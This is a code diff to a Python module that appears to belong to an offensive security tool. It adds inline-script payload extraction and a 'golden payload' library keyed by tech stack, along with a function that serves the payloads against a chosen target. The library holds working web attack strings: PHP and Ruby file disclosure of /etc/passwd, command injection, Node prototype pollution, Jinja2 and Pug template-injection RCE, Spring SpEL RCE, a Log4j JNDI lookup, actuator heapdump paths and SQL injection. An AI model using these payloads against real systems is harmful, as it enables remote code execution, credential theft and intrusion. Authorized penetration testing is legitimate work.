@@ -306,8 +306,17 @@ def auto_vault_script_payloads(
 
     # 2. Extract payload candidates via AST + Regex
     candidates: List[Tuple[str, str]] = []  # List of (payload, param_hint)
-    if script_content and ("def " in script_content or "import " in script_content or "=" in script_content):
-        ast_hits = extract_ast_script_payloads(script_content)
+
+    # Check if command has inline script (-c "..." or -e "...")
+    inline_code = ""
+    if command:
+        m_inline = re.search(r'''(?:python[0-9]?|node|ruby|perl|bash|sh)\s+(?:-c|-e)\s+(['"])(.*?)\1''', command, re.DOTALL | re.IGNORECASE)
+        if m_inline:
+            inline_code = m_inline.group(2)
+
+    all_script_code = f"{script_content or ''}\n{inline_code}".strip()
+    if all_script_code and ("def " in all_script_code or "import " in all_script_code or "=" in all_script_code):
+        ast_hits = extract_ast_script_payloads(all_script_code)
         for p_val, p_hint, p_url in ast_hits:
             if not target_url and p_url:
                 target_url = p_url
@@ -409,3 +418,55 @@ def auto_vault_script_payloads(
             db.rollback()
 
     return created_entries
+
+
+# ==============================================================================
+# TARGET CONTEXT-AWARE MEMORY: CURATED GOLDEN PAYLOADS BY TECH STACK (RAG)
+# ==============================================================================
+GOLDEN_TECH_STACK_PAYLOADS: Dict[str, List[Dict[str, Any]]] = {
+    "PHP": [
+        {"vuln_type": "LFI", "payload": "php://filter/convert.base64-encode/resource=index.php", "description": "PHP Base64 Filter wrapper source disclosure"},
+        {"vuln_type": "LFI", "payload": "../../../../etc/passwd%00", "description": "Null byte poison LFI bypass"},
+        {"vuln_type": "AUTH_BYPASS", "payload": "0e215962017", "description": "PHP Type Juggling magic hash bypass"},
+        {"vuln_type": "CMD_INJECTION", "payload": ";system('id');", "description": "Direct PHP system command injection"}
+    ],
+    "NODE": [
+        {"vuln_type": "PROTOTYPE_POLLUTION", "payload": '{"__proto__":{"admin":true}}', "description": "JSON object prototype pollution privilege escalation"},
+        {"vuln_type": "PROTOTYPE_POLLUTION", "payload": '{"constructor":{"prototype":{"isAdmin":true}}}', "description": "Constructor prototype tampering"},
+        {"vuln_type": "SSTI", "payload": "{{root.process.mainModule.require('child_process').execSync('id').toString()}}", "description": "Node Pug/EJS sandbox breakout RCE"},
+        {"vuln_type": "SSRF", "payload": "http://127.0.0.1:8080/api/v1/internal", "description": "Node loopback internal service SSRF"}
+    ],
+    "PYTHON": [
+        {"vuln_type": "SSTI", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "description": "Jinja2 Flask/Django template injection RCE"},
+        {"vuln_type": "SSTI", "payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "description": "Python object class hierarchy enumeration"},
+        {"vuln_type": "SQLI", "payload": "' OR 1=1 -- -", "description": "Standard SQLite/PostgreSQL tautology bypass"}
+    ],
+    "JAVA": [
+        {"vuln_type": "RCE", "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "description": "Spring Framework SpEL expression injection RCE"},
+        {"vuln_type": "INFO_DISCLOSURE", "payload": "/actuator/env", "description": "Spring Boot Actuator environment properties leak"},
+        {"vuln_type": "INFO_DISCLOSURE", "payload": "/actuator/heapdump", "description": "Spring Boot Actuator memory heapdump extraction"},
+        {"vuln_type": "JNDI", "payload": "${jndi:ldap://127.0.0.1:1389/a}", "description": "Log4j JNDI remote class lookup injection"}
+    ],
+    "GRAPHQL": [
+        {"vuln_type": "GRAPHQL", "payload": '{"query":"{__schema{types{name,fields{name}}}}"}', "description": "GraphQL Full Schema Introspection query"},
+        {"vuln_type": "GRAPHQL", "payload": '{"query":"query { a: __typename b: __typename }"}', "description": "GraphQL Alias Batching / amplification query"}
+    ],
+    "RUBY": [
+        {"vuln_type": "SSTI", "payload": "<%= File.read('/etc/passwd') %>", "description": "Ruby ERB template file disclosure"},
+        {"vuln_type": "CMD_INJECTION", "payload": "| id", "description": "Ruby Open3 / IO pipe command injection"}
+    ]
+}
+
+
+def get_golden_payloads_for_stack(tech_stack: str, vuln_category: Optional[str] = None) -> List[Dict[str, Any]]:
+    """Retrieves curated, high-probability golden exploit vectors matching target tech stack."""
+    clean_stack = (tech_stack or "").upper().strip()
+    results: List[Dict[str, Any]] = []
+
+    for stack_key, p_list in GOLDEN_TECH_STACK_PAYLOADS.items():
+        if stack_key in clean_stack or clean_stack in stack_key:
+            for item in p_list:
+                if not vuln_category or item.get("vuln_type") == vuln_category.upper():
+                    results.append(item)
+
+    return results
